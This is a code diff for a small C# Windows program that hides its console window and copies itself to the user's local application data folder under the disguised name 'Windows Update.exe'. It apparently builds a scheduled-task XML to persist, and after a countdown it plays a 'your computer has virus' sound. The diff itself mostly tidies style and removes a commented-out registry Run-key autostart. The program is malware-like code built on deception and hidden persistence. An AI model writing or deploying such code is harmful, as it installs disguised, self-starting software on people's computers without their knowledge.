@@ -10,14 +10,14 @@ using System.Timers;
 
 namespace computar
 {
-    class Program
+    static class Program
     {
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
 
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-        static int countdown_yur_compiutar_has_vairus = 0;
+        static int countdown_yur_compiutar_has_vairus;
         static readonly Timer timer1 = new Timer();
         static readonly string location_path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft", "Windows Update.exe");
         static void Main()
@@ -36,14 +36,16 @@ namespace computar
         private static async void Timer1_Tick(object sender, EventArgs e)
         {
             if (countdown_yur_compiutar_has_vairus != 0)
+            {
                 countdown_yur_compiutar_has_vairus--;
+            }
             else
             {
                 Stream str = Properties.Resources.hello_your_computer_has_virus;
                 System.Media.SoundPlayer snd = new System.Media.SoundPlayer(str);
                 snd.Play();
                 timer1.Stop();
-                await Task.Delay(5000);
+                await Task.Delay(5000).ConfigureAwait(false);
                 Environment.Exit(0);
             }
         }
@@ -53,9 +55,6 @@ namespace computar
             if (!File.Exists(location_path))
             {
                 File.Copy(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location + "\\" + AppDomain.CurrentDomain.FriendlyName), location_path);
-                //RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                //rk.SetValue("Microsoft Windows Update", location_path);
-
                 // Running as admin may work because Micro$oft sucks
                 StringBuilder sb = new StringBuilder();
                 sb.AppendLine("<?xml version=\"1.0\" encoding=\"UTF-16\"?>");
@@ -135,9 +134,7 @@ namespace computar
                     Task.Delay(1000);
                     Environment.Exit(0);
                 }
-                catch (Exception)
-                {
-                }
+                catch (Exception) {; }
             }
         }
     }
